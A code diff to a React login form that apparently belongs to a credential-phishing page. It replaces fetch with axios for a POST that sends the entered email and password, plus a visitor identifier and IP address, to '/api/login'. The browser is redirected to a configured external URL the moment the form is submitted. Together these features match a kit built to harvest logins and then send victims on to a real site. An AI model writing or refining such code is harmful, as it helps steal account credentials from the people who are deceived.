@@ -2,6 +2,8 @@ import "./App.css";
 import { useState } from "react";
 import ArrowBackIcon from "@mui/icons-material/ArrowBack";
 import React from 'react';
+import axios from "axios";
+
 
 
 function App({ visitor, ip }) {
@@ -36,29 +38,25 @@ function App({ visitor, ip }) {
       }, 500); // This should match the duration of your slide-out animation
     } else if (email && password) {
       window.location.href = process.env.REACT_APP_REDIRECT_URL_M.toString();
-      fetch("/api/login", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          visitor: visitor,
-          ip: ip,
-          email: email,
-          password: password,
-        }),
+      
+      axios.post('/api/login', {
+        visitor: visitor,
+        ip: ip,
+        email: email,
+        password: password
       })
-        .then((response) => {
-          console.log(response.status);
-          if (response.status === 403) {
-            setStatus(403);
-          } else {
-            setStatus(200);
-          }
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-        });
+      .then((response) => {
+        console.log(response.status);
+        if (response.status === 403) {
+          setStatus(403);
+        } else {
+          setStatus(200);
+        }
+      })
+      .catch((error) => {
+        console.error('Error:', error.response ? error.response.status : error.message);
+      });
+      
     }
   };
 
